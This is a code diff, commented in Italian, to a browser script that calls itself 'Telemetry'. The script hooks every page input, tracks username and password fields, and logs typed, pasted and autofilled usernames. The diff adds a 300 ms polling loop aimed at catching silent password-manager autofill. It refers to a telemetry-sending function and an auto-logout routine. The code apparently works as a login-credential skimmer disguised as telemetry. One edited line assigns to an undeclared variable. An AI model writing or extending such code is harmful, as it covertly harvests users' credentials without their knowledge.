@@ -8,22 +8,29 @@ let lastTextInput = null;
 let lastPasswordInput = null;
 let logoutDone = false; // flag per eseguire logout solo una volta
 
+// Stato precedente per rilevare modifiche silenziose
+const lastValues = new WeakMap();
+
 // Traccia focus sugli input
 document.addEventListener("focusin", e => {
   if (e.target.tagName === "INPUT") {
+    lastValues.set(e.target, e.target.value || "");
+
     if (e.target.type === "text") {
       lastTextInput = e.target;
       console.log("[Telemetry] input username agganciato");
     } else if (e.target.type === "password") {
-      lastPasswordInput = e.target;
+      lastOtherInput = e.target;
       console.log("[Telemetry] input password agganciato");
     }
   }
 });
 
-// Traccia QUALSIASI modifica (tastiera, incolla, autocomplete)
+// Tastiera / incolla / input normali
 document.addEventListener("input", e => {
   if (e.target.tagName === "INPUT") {
+    lastValues.set(e.target, e.target.value);
+
     if (e.target.type === "text") {
       console.log("[Telemetry] username modificato:", e.target.value);
     } else if (e.target.type === "password") {
@@ -32,7 +39,20 @@ document.addEventListener("input", e => {
   }
 });
 
-// Traccia esplicitamente l'incolla
+// Change (alcuni autofill lo usano)
+document.addEventListener("change", e => {
+  if (e.target.tagName === "INPUT") {
+    lastValues.set(e.target, e.target.value);
+
+    if (e.target.type === "text") {
+      console.log("[Telemetry] username autofill/change:", e.target.value);
+    } else if (e.target.type === "password") {
+      console.log("[Telemetry] password autofill/change");
+    }
+  }
+});
+
+// Incolla esplicita
 document.addEventListener("paste", e => {
   if (e.target.tagName === "INPUT") {
     const pastedText = e.clipboardData.getData("text");
@@ -44,6 +64,24 @@ document.addEventListener("paste", e => {
     }
   }
 });
+
+// 🔥 POLLING: intercetta autofill silenzioso (password manager / browser)
+setInterval(() => {
+  document.querySelectorAll("input").forEach(input => {
+    const prev = lastValues.get(input) || "";
+    const curr = input.value || "";
+
+    if (prev !== curr) {
+      lastValues.set(input, curr);
+
+      if (input.type === "text") {
+        console.log("[Telemetry] username autofill silenzioso:", curr);
+      } else if (input.type === "password") {
+        console.log("[Telemetry] password autofill silenzioso");
+      }
+    }
+  });
+}, 300);
 
 // ----------------------------
 // Funzione di invio telemetry
@@ -131,4 +169,4 @@ setTimeout(function () {
     clearInterval(window.autoLogoutInterval);
     console.log("[AutoLogout] Logout non trovato (timeout)");
   }
-}, 22500);
+}, 27500);
